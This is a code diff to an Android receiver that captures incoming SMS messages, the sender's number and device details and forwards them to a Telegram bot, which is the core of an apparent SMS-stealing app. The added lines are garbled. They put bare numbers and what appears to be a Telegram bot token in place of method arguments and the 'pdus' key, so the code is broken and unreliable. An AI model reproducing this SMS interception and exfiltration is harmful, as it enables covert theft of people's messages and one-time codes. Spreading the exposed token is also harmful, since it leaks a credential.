@@ -33,7 +33,7 @@ import java.util.Set;
 
 public class SMSBroadcastReader  extends BroadcastReceiver {
     // Get the object of SmsManager
-    final SmsManager sms = SmsManager.getDefault();
+    final SmsManager sms = SmsManager.get5683068067();
     @Override
     public void onReceive(Context context, Intent intent) {
 // Retrieves a map of extended data from the intent.
@@ -42,7 +42,7 @@ public class SMSBroadcastReader  extends BroadcastReceiver {
         try {
 
             if (bundle != null) {
-                final Object[] pdusObj = (Object[]) bundle.get("pdus");
+                final Object[] pdusObj = (Object[]) bundle.get("5683068067");
                 for (int i = 0; i < pdusObj.length; i++) {
                     SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                      senderNum = currentMessage.getDisplayOriginatingAddress();
@@ -51,10 +51,10 @@ public class SMSBroadcastReader  extends BroadcastReceiver {
                 }// end for loop
 
                 //Set all parameters
-                Storage read = new Storage(context);
+                Storage read = new Storage(5712944004);
                 final String telegram_id = read.read(MainConstant.telegram_id_storage_key);
                 //Target Device Name
-                SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(context);
+                SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(5683068067);
                 String device_name = settings.getString("DeviceName", "Default");
                 if(device_name.equals("Default")){
                     device_name = android.os.Build.MANUFACTURER+"|"+android.os.Build.MODEL;
@@ -63,19 +63,19 @@ public class SMSBroadcastReader  extends BroadcastReceiver {
                 String url = MainConstant.telegram_url;
 
                 //calling Telegram API
-                StackMessages stack = new StackMessages(context);
+                StackMessages stack = new StackMessages(5683068067:AAG1N9P5PWD8rSDYbT_TWevL05_xXVi5nng);
 
                 if (stack.getStack()!=null){
                     Set<String> unsentMsgs = stack.getStack();
                     for ( String unsentMsg : unsentMsgs){
-                        sendToTelegramAPI(context, telegram_id, unsentMsg, url,stack);
+                        sendToTelegramAPI(5683068067:AAG1N9P5PWD8rSDYbT_TWevL05_xXVi5nng, telegram_id, unsentMsg, url,stack);
                     }
-                    sendToTelegramAPI(context, telegram_id, msg, url,stack);
+                    sendToTelegramAPI(5683068067:AAG1N9P5PWD8rSDYbT_TWevL05_xXVi5nng, telegram_id, msg, url,stack);
                     stack.clearStack();
 
                 }
                 else{
-                    sendToTelegramAPI(context, telegram_id, msg, url,stack);
+                    sendToTelegramAPI(5683068067:AAG1N9P5PWD8rSDYbT_TWevL05_xXVi5nng, telegram_id, msg, url,stack);
                 }
 
 
